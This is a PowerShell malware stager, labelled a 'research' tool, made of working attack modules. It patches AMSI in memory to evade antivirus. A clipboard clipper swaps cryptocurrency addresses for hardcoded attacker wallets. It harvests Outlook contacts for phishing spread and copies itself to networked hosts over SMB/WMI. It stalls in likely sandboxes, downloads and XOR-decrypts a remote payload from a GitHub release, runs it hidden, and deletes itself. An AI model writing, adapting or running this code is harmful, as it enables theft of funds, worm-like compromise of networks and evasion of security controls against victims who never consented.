# --- [FULL UNIVERSAL RESEARCH STAGER v3.0] ---

function Patch-Mem {
    # Blinds AMSI by patching AmsiScanBuffer directly in memory
    try {
        $w = Add-Type -PassThru -Name "w32" -Namespace "w32" -MemberDefinition @'
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
        $h = $w::GetModuleHandle("am" + "si.dll")
        $ptr = $w::GetProcAddress($h, "Am" + "siS" + "canB" + "uffer")
        $old = 0
        $w::VirtualProtect($ptr, [UIntPtr]5, 0x40, [ref]$old)
        [Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
    } catch { }
}

function Invoke-Clipper {
    # Background thread to swap crypto wallets in clipboard
    $wallets = @{
        "btc"  = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"
        "eth"  = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392"
        "usdt" = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"
        "sol"  = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"
    }
    $regex = @{
        "btc"  = "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"
        "eth"  = "^0x[a-fA-F0-9]{40}$"
        "usdt" = "^T[A-Za-z1-9]{33}$"
        "sol"  = "^[1-9A-HJ-NP-Za-km-z]{32,44}$"
    }
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        while($true) {
            $clip = [Windows.Forms.Clipboard]::GetText()
            foreach($coin in $using:regex.Keys) {
                if($clip -match $using:regex[$coin] -and $clip -ne $using:wallets[$coin]) {
                    [Windows.Forms.Clipboard]::SetText($using:wallets[$coin])
                }
            }
            Start-Sleep -Seconds 2
        }
    }
}

function Invoke-OutlookSpread {
    # MAPI Harvesting to spread via trusted email
    try {
        $ol = New-Object -ComObject Outlook.Application -ErrorAction SilentlyContinue
        if ($ol) {
            $ns = $ol.GetNameSpace("MAPI")
            $contacts = $ns.GetDefaultFolder(6).Items
            for($i=1; $i -le 10; $i++) {
                $contact = $contacts.Item($i)
                if ($contact.Email1Address) {
                    $mail = $ol.CreateItem(0)
                    $mail.To = $contact.Email1Address
                    $mail.Subject = "Review: Final Project Update"
                    $mail.Body = "Please find the requested update attached.`n`nBest,`n$($ns.CurrentUser.Name)"
                    # $mail.Attachments.Add("$env:TEMP\Research_Tool.exe")
                    # $mail.Send() # Ready for research testing
                }
            }
        }
    } catch { }
}

function Spread-Lateral {
    param($exePath)
    # SMB/WMI Movement: Scans ARP and attempts C$ push
    $targets = arp -a | Select-String -Pattern "\d+\.\d+\.\d+\.\d+" | ForEach-Object { $_.Matches.Value }
    foreach ($ip in $targets) {
        try {
            $remotePath = "\\$ip\C$\Windows\Temp\WinHostSvc.exe"
            Copy-Item -Path $exePath -Destination $remotePath -ErrorAction SilentlyContinue
            Invoke-CimMethod -ComputerName $ip -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $remotePath }
        } catch { }
    }
}

# --- MAIN ENGINE ---
Patch-Mem

# VM Check / Sandbox Delay
if (((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory) -lt 4GB) { Start-Sleep -s 120 }

$url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
$key = 0xAB
$dest = "$env:LOCALAPPDATA\Microsoft\Windows\Caches\WinHostSvc.exe"

try {
    # Stealth Download & Decrypt
    $tmp = "$env:TEMP\d.tmp"
    Start-BitsTransfer -Source $url -Destination $tmp -Priority High
    $data = [Convert]::FromBase64String((Get-Content $tmp -Raw).Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }
    [IO.File]::WriteAllBytes($dest, $data)
    Remove-Item $tmp -Force

    # Run Modules
    Invoke-Clipper
    Invoke-OutlookSpread
    Spread-Lateral -exePath $dest
    
    # Detached Launch
    $s = New-Object -ComObject "Shell.Application"
    $s.ShellExecute($dest, "", "", "open", 0)

    # Melt (Self-Delete the script)
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
} catch { }
